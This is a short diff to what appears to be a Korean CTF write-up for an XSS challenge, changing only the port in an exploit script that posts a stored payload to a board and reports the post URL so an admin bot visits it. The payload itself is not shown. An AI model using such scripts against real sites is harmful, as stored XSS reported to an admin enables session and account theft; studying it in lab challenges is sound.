@@ -65,7 +65,7 @@ s.post(f"{BASE}/write", data={"subject": "x", "content": payload})
 
 board = s.get(f"{BASE}/board").text
 post_id = max(re.findall(r"/board/(\d+)", board), key=int)
-s.post(f"{BASE}/report", data={"url": f"http://xss-1:9101/board/{post_id}"})
+s.post(f"{BASE}/report", data={"url": f"http://xss-1:9102/board/{post_id}"})
 ```
 
 ## 풀이 과정
